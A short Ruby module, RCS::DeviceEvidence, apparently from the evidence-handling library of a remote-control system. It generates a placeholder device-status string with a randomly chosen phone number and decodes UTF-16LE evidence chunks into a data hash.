require 'rcs-common/evidence/common'

module RCS

module DeviceEvidence
  def content
    cnt = "The time is #{Time.now} and everything is ok... till now"

    if pn = ["SIM not present", "unknown", "+12345678", nil].sample
      cnt << "\nPhoneNumber: #{pn}"
    end

    return cnt.to_utf16le_binary
  end

  def generate_content
    [ content ]
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new if info[:data].nil?
    info[:data][:content] = chunks.join.utf16le_to_utf8
    yield info if block_given?
    :delete_raw
  end
end

end # RCS::
